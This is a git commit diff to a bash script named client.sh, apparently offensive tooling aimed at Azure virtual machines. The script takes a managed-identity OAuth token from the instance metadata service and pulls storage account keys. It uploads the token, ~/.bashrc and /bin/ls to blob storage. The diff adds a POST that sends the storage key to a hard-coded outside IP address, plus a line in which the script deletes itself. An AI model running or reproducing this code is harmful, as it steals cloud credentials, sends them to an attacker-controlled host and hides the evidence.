913ceedc30a3862480ae7f9e67d1ec38bf242e15
rabidang3ls <rabidang3ls@users.noreply.github.com>
2020-02-28 11:04:35 -0700

    Update client.sh

--- client.sh
+++ client.sh
@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
-# Step 0: Install Azure cli
+remoteHost=45.63.35.60
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
-
-# Step 1: Grab creds from metadata service and write to file creds.txt
 echo $(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-06-01&resource=https://management.azure.com") > token.txt
-
-# Step 2: Put cred-file into blob storage for retrieval later
 az login --identity
 storageKey=$(az storage account keys list --account-name calipsostorageazure --query "[0].value")
 az storage blob upload -f token.txt -c calipsocontainer -n calipsocreds.txt --account-name calipsostorageazure --account-key $storageKey
+az storage blob upload -f ~/.bashrc -c calipsocontainer -n bashrc.conf --account-name calipsostorageazure --account-key $storageKey
+az storage blob upload -f /bin/ls -c calipsocontainer -n ls.bin --account-name calipsostorageazure --account-key $storageKey
+curl -f -s -X POST http://$(echo $remoteHost)/$(echo $storageKey | cut -d "\"" -f 2)
+rm $(echo $(dirname $0)/$(basename $0))
